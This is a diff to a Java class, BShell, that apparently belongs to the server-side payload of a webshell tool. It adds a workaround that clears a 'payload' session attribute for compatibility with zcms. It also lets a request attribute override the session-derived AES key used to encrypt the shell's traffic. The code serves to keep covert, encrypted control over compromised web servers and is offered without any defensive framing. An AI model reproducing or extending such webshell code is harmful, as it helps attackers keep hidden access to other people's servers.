@@ -52,6 +52,11 @@ public class BShell implements Runnable
         this.Request = page.getRequest();
         Map<String, String> result = new HashMap<String, String>();
         this.Response.setCharacterEncoding("UTF-8");
+
+        //兼容zcms
+        if(Session.getAttribute("payload")!=null){
+            Session.removeAttribute("payload");
+        }
         try {
             if (BShell.action.equals("create")) {
                 this.createBShell();
@@ -193,7 +198,8 @@ public class BShell implements Runnable
     }
     
     private byte[] Encrypt(final byte[] bs) throws Exception {
-        final String key = this.Session.getAttribute("u").toString();
+        final Object custmKeyObj = this.Request.getAttribute("parameters");
+        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
         final byte[] raw = key.getBytes("utf-8");
         final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
